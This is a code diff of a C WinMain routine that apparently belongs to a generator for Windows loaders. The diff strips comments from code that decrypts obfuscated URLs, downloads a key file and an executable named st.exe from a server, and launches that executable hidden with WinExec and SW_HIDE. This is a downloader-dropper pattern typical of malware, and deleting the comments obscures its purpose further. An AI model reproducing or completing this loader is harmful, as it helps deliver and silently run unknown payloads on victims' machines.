@@ -129,7 +129,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     unsigned char encKeyUrl[] = { ${keyUrlArr} };
     unsigned char encStUrl[] = { ${stUrlArr} };
 
-    // 1. Fetch key.json dynamically from the server
     wchar_t keyUrl[1024];
     decrypt_url(keyUrl, encKeyUrl, sizeof(encKeyUrl));
     
@@ -137,7 +136,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
     download_file(keyUrl, keyPath);
 
-    // 2. Download st.exe
     wchar_t stUrl[1024];
     decrypt_url(stUrl, encStUrl, sizeof(encStUrl));
     
@@ -145,7 +143,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
     download_file(stUrl, dest);
 
-    // 3. Launch st.exe silently
     char ansiDest[MAX_PATH];
     WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     WinExec(ansiDest, SW_HIDE);
